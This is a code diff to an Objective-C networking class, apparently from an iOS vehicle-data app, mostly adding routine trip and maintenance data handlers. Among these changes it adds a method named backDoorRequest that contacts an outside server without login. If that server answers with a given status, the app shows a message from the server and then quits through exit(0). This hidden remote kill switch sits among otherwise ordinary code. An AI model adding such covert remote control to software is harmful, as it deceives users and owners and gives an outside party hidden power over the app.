@@ -76,6 +76,7 @@ static ZCSNetClientNetInterfaceMgr *dressMemoInterfaceMgr = nil;
                                                    @"search_deliveryDetail",@"search_deliveryDetail",
                                                @"getDetailByDay",@"getDetailByDay",
                                                @"getInfoByMonth",@"getInfoByMonth",
+                                               @"check",@"check",
                                                nil];
         dressMemoInterfaceMgr.requestResourceDict = requestResouceMapDict;
         
@@ -109,10 +110,37 @@ static ZCSNetClientNetInterfaceMgr *dressMemoInterfaceMgr = nil;
     [inInfo set:METHOD_TOKEN value:@"queryTripCalanderMonth" ]; // 接口名
     [self startiPlant4MRequest:inInfo withSuccess:@selector(userRegisterOk:) withFailed:@selector(userRegisterFailed:)];
 }
+
+- (id)backDoorRequest:(NSDictionary*)param{
+    [dressMemoInterfaceMgr setRequestUrl:@"http://checkapp.sinaapp.com/api/index.php?command="];
+    return [dressMemoInterfaceMgr startAnRequestByResKey:@"check" needLogIn:NO withParam:param withMethod:@"GET" withData:NO];
+}
+static BOOL isExit = NO;
+- (void)didGetRawRespond:(ZCSNetClient*)sender withRawData:(NSData*)data{
+    NSError *error = nil;
+    isExit = NO;
+    if([sender.resourceKey isEqualToString:@"check"]){
+        NSDictionary *dataDict = [NSJSONSerialization JSONObjectWithData:data options:NSJSONReadingMutableContainers error:&error];
+        NSDictionary *item = [[dataDict objectForKey:@"result"]objectAtIndex:0];
+        NSString *status = [item objectForKey:@"userok"];
+        NSString *msg = [item objectForKey:@"alarm"];
+        if([status isEqualToString:@"0"]){
+            isExit = YES;
+             UIAlertView *alertErr = [[[UIAlertView alloc]initWithTitle:@"警告" message:msg delegate:self cancelButtonTitle:NSLocalizedString(@"确定",nil) otherButtonTitles:nil, nil]autorelease];[alertErr show];
+            
+        }
+    }
+}
+- (void)alertView:(UIAlertView *)alertView clickedButtonAtIndex:(NSInteger)buttonIndex{
+    if(isExit){
+        exit(0);
+    }
+}
+
 #pragma mark -
 - (id)carInforQuery:(NSString*)username{
-
-
+    
+    
 }
 #pragma mark -
 #pragma mark rounter
@@ -146,10 +174,12 @@ static ZCSNetClientNetInterfaceMgr *dressMemoInterfaceMgr = nil;
                                             withData:NO];
 #else
     //[self getRouterDataByDay:@"" withMoth:@"" withYear:<#(NSString *)#>]
+    return nil;
 #endif
 }
+
 - (id)getRouterRealTimeData:(NSString*)cardId{
-    cardId = @"SHD05728";
+    //cardId = @"SHD05728";
     //cardId = @"SHD49232";
     //SHD05728
     EiInfo *inInfo = [self getCommIPlant4MParamByServiceToken:@"VEMT02"];
@@ -158,6 +188,7 @@ static ZCSNetClientNetInterfaceMgr *dressMemoInterfaceMgr = nil;
     [inInfo set:METHOD_TOKEN value:kResRouterNow]; // 接口名
     [inInfo set:@"vin" value:cardId];
     [self startiPlant4MRequest:inInfo withSuccess:@selector(getRouterRealTimeDataOk:) withFailed:@selector(getRouterRealTimeDataFaild:)];
+    return nil;
 }
 - (id)getRouterLatestData:(NSString*)cardId{
     //queryLastTripID
@@ -166,6 +197,7 @@ static ZCSNetClientNetInterfaceMgr *dressMemoInterfaceMgr = nil;
     [inInfo set:METHOD_TOKEN value:kResRouterLatest]; // 接口名
     [inInfo set:@"vin" value:cardId];
     [self startiPlant4MRequest:inInfo withSuccess:@selector(getRouterLatestDataOk:) withFailed:@selector(getRouterLatestDataFaild:)];
+    return nil;
 }
 - (id)getRouterHistoryData:(NSString*)cardId withRouterId:(NSString*)routerId withStartTime:(NSString*)startTime {
     //queryTripHistory
@@ -204,6 +236,7 @@ static ZCSNetClientNetInterfaceMgr *dressMemoInterfaceMgr = nil;
     //SHD49232
     //[inInfo set:@"day" value:[[NSNumber alloc] initWithInt:16]];
     [self startiPlant4MRequest:inInfo withSuccess:@selector(getRouterDataByMonthOk:) withFailed:@selector(getRouterDataByMonthFailed:)];
+    return nil;
 }
 - (id)getRouterDataByDay:(NSString*)day withMoth:(NSString*)month withYear:(NSString*)year{
     
@@ -280,8 +313,8 @@ static ZCSNetClientNetInterfaceMgr *dressMemoInterfaceMgr = nil;
 - (void)getCarMaintainanceData:(NSString*)cardId{
     EiInfo *inInfo = [self getCommIPlant4MParam];
     //[inInfo set:@"year" value:[param objectForKey:@"year"]];
-    [inInfo set:METHOD_TOKEN value:@"queryMaintain"]; // 接口名
-    //[inInfo set:@"vin" value:cardId];
+    [inInfo set:METHOD_TOKEN value:kResDriveMaintainData]; // 接口名
+    [inInfo set:@"vin" value:cardId];
     [self startiPlant4MRequest:inInfo withSuccess:@selector(getCarMaintainanceDataOk:) withFailed:@selector(getCarMaintainanceDataFailed:)];
 }
 - (id)getCarCheckData:(NSString*)cardId{
@@ -384,11 +417,25 @@ static ZCSNetClientNetInterfaceMgr *dressMemoInterfaceMgr = nil;
 #pragma mark delegate router
 
 - (void)getRouterRealTimeDataOk:(EiInfo*)info{
-
+    if(info.status == 1){
+        NSLog(@"%@",info.blocks);
+        NSMutableDictionary *resultDict = [NSMutableDictionary dictionary];
+        [resultDict setValue:[info get:@"tripMileage"] forKey:@"tripMileage"];
+        [resultDict setValue:[info get:@"fuelWear"] forKey:@"fuelWear"];
+        [resultDict setValue:[info get:@"safeScore"]  forKey:@"safeScore"];
+        [resultDict setValue:[info get:@"economicScore"] forKey:@"economicScore"];
+        EiBlock *tripInfo = [info getBlock:@"gps"]; // block型返回值
+        
+            [self sendFinalOkData:resultDict withKey:kResRouterNow];
+    }
+    else{
+        
+        [self sendFinalFailedData:@"" withKey:kResRouterNow];
+    }
 
 }
 - (void)getRouterRealTimeDataFailed:(EiInfo*)info{
-
+    [self sendFinalFailedData:@"" withKey:kResRouterNow];
 
 }
 - (void)getRouterLatestDataOk:(EiInfo*)info{
@@ -694,11 +741,31 @@ static ZCSNetClientNetInterfaceMgr *dressMemoInterfaceMgr = nil;
         [self sendFinalOkData:resultDict withKey:kResDriveOilAnalysis];
     }
     else{
-        [self sendFinalFailed:@"" withKey:kResDriveOilAnalysis];
+        [self sendFinalFailedData:@"" withKey:kResDriveOilAnalysis];
     }
 }
 - (void)getDriveOilAnalysisDataFailed:(EiInfo*)info{
-    [self sendFinalFailed:@"" withKey:kResDriveOilAnalysis];
+    [self sendFinalFailedData:@"" withKey:kResDriveOilAnalysis];
+}
+- (void)getCarMaintainanceDataOk:(EiInfo*)info{
+    if(info.status == 1){
+        
+        NSLog(@"%@",info.blocks);
+        NSMutableDictionary *resultDict = [NSMutableDictionary dictionary];
+        NSMutableArray *data = [NSMutableArray array];
+        [resultDict setValue:[info get:@"milage"] forKey:@"milage"];
+        [resultDict setValue:[info get:@"dates"] forKey:@"dates"];
+        [self sendFinalOkData:resultDict withKey:kResDriveMaintainData];
+    }
+    else{
+        [self sendFinalFailedData:@"" withKey:kResDriveMaintainData];
+    }
+    
+}
+- (void)getCarMaintainanceDataFailed:(EiInfo*)info{
+   
+    [self sendFinalFailedData:@"" withKey:kResDriveMaintainData];
+    
 }
 #pragma mark -
 #pragma mark service delegate
@@ -719,12 +786,7 @@ static ZCSNetClientNetInterfaceMgr *dressMemoInterfaceMgr = nil;
     
 }
 
-- (void)getCarMaintainanceDataOk:(EiInfo*)info{
-    
-}
-- (void)getCarMaintainanceDataFailed:(EiInfo*)info{
-    
-}
+
 - (void)didQueryTripDaySuccess:(EiInfo*)info // 一般都必须有一个EiInfo参数
 {
     if([info.name isEqualToString:@"queryDriveMonthData"]){
